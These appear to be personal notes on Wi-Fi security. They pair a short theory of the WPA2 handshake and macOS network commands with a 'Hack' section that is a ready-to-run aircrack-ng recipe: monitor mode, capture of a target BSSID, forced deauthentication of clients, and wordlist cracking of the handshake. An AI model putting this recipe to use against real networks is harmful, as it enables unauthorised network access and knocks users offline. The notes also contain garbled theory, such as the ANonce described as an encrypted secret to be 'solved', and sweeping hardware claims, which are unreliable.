# Theory

### WPA1 and WPA2 are less secure

When a client connects to Wi-Fi:

- AP → Client: sends a random number (ANonce)
- Client → AP: sends its own (SNonce) + proof
- AP → Client: confirms and sends encryption info
- Client → AP: final confirmation

WPA1 and WPA2 are less secure, since on the handshake the router sends a encrypted random secret (ANonce) to the client, which has to be solved (using the password) and sent back (SNonce + proof).

That means, if a malicious client captures the handshake, it can try to brute-force a weak password locally (e.g. using a wordlist), without incurring into rate limits.

# Test

### Connecting from the Terminal to a Network

Yes — you can connect to a Wi-Fi network from the terminal on macOS (including M1/M2/M3 Macs). The built-in tool for this is `networksetup`.

---

#### 🔌 1. Find your Wi-Fi interface

```bash
networksetup -listallhardwareports
```

Look for something like:

```
Hardware Port: Wi-Fi
Device: en0
```

---

#### 📡 2. Connect to a WLAN

Use:

```bash
networksetup -setairportnetwork en0 "SSID_NAME" "PASSWORD"
```

Example:

```bash
networksetup -setairportnetwork en0 "MyWiFi" "mypassword123"
```

Notes:

- SSID is case-sensitive.
- If the password is wrong, macOS won’t connect but also won’t always show a clear error.
- For hidden networks, the same command works if SSID is correct.

# Hack

### Limitations

#### MacBook

MacBook can be utilized for analysing already captured network packets, BUT NOT FOR VISUALIZING/CAPTURING THEM!

It's a hardware characteristic, where the MacBook intentionally have no network monitoring interface showing RAW, UNMODIFIED network packages.
Mac's Hardware + it's OS filters out what's shown there. Using Docker or a Linux VM wouldn't work.

Here, the best alternative is to use another computer with Linux or even a RaspberryPi.

#### Hydra

Hydra does not focus on WIFI-hacking, but on other common protocols like ssh, stp, etc...

Instead, use use `airodump-ng` from the package `aircrack-ng` .

### Hacking with Linux

Install:

```
sudo apt install aircrack-ng
```

Start monitoring mode:

```
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

Scan for networks:

```
sudo airodump-ng wlan0mon
```

Focus on target:

```
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

Deconnect for automatic reconnect handshake:

```
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
```

Crack the password:

```
sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

--- maybe exclude from here?
Install:

```
brew install aircrack-ng
```

Test command:

```
airodump-ng
```

```

airmon-ng start wlan0
airodump-ng wlan0mon
```

```
aircrack-ng capture.cap
aircrack-ng -w rockyou.txt capture.cap
```
